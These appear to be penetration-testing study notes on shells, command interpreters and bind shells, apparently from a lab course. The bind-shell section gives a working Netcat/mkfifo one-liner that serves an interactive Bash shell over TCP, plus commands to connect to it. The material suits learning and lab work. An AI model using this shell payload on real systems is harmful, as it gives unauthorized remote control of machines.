# Introduction
### Shell Overview for Penetration Testing

A **shell** provides a command-line interface (CLI) to interact with the system (e.g., Bash, cmd, PowerShell). For penetration testers, getting a shell often means successfully exploiting a vulnerability to gain remote access and control over a target machine.

### Why Get a Shell?
- **Direct OS Access**: Run system commands, explore the file system, and escalate privileges.
- **Persistence**: Keep access to work longer, transfer files, and exfiltrate data.
- **Low Detection**: Shells are harder to detect than graphical access (e.g., RDP, VNC), and faster for OS navigation and automation.

### Types of Shells:
- **Standard Shells**: Gained by exploiting vulnerabilities (e.g., EternalBlue to access cmd on Windows).
- **Web Shells**: Exploit web vulnerabilities (e.g., file upload) and use a browser to issue commands.

### Payloads Deliver Shells
- **Payload**: Code designed to exploit a system vulnerability, often leading to remote shell access.

# Shell Basics

## Anatomy of a Shell
Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. 

### Command Language Interpreters:
- A **command language interpreter** translates user commands into actions the operating system can execute.
- It's part of the **command-line interface (CLI)**, which includes:
  1. **Operating system**: The core system managing the computer.
  2. **Terminal emulator**: The window or app where you type commands (e.g., Terminal, Command Prompt).
  3. **Interpreter**: The translator that processes commands (e.g., Bash, PowerShell, cmd).
  
- **Command language interpreters** can also be called **shell scripting languages** or **Command and Scripting interpreters**.
- These interpreters allow users to run commands and scripts to manage systems or exploit vulnerabilities.
- Understanding which interpreter is in use helps choose the correct commands and scripts.

### MITRE ATT&CK Matrix:
- The **MITRE ATT&CK Matrix** is a framework listing techniques used by attackers to exploit systems.
- **Execution techniques** describe methods attackers use to run malicious code, including through command interpreters.
  
- Knowledge of command language interpreters and execution techniques is useful for gaining control over vulnerable systems (e.g., getting a shell session).

### Example in Parrot OS
When we opened the MATE terminal, it used a command language interpreter, indicated by the $ prompt, common in Bash, Ksh, and POSIX shells. When typing a random command and hitting enter, Bash responded that it didn't recognize the command, showing that interpreters have their own set of recognized commands. Another way to identify the interpreter is by viewing running processes in Linux using a command like ps.(open green for bash and blue for powershell on the top right corner)

__Shell Validation From 'ps'__
```
ps
```
__Shell Validation Using 'env'__
```
env
```

## Bind Shells
we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a Bind shell or reverse shell
![image](https://github.com/user-attachments/assets/a238083c-1244-447c-9a1b-dd5f8ead06f0)

### Challenges in Getting a Shell:

1. **Listener Needed**: There must be a listener running on the target.
2. **Starting a Listener**: If no listener is active, you need to start one.
3. **Firewall and NAT/PAT**: 
   - Strict incoming firewall rules and NAT/PAT on the network edge can block external connections.
   - You typically need to be on the internal network to bypass these rules.
4. **OS Firewalls**: 
   - Windows and Linux firewalls often block incoming connections not associated with trusted applications.

### Example bind shell implementation 
Netcat (nc) is considered our Swiss-Army Knife since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. 

__No. 1: Server - Target starting Netcat listener__
```
Target@server:~$ nc -lvnp 7777
```
__No. 2: Client - Attack box connecting to target__
```
nc -nv 10.129.41.200 7777
```
once connected you will see succeeded output on attackbox and connection recieved on target. you can send messages by simply typing into the attack box terminal. We still havent got shell its just a tcp connection.

### Establishing a Basic Bind Shell with Netcat
we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.

__No. 1: Server - Binding a Bash shell to the TCP session__
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
this is a payload.

__No. 2: Client - Connecting to bind shell on target__
```
nc -nv 10.129.41.200 7777
```
you will notice $ means shell. The exercises helped us understand how a bind shell works without security controls like NAT, firewalls, IDS/IPS, or authentication mechanisms (unrealistic scenario).


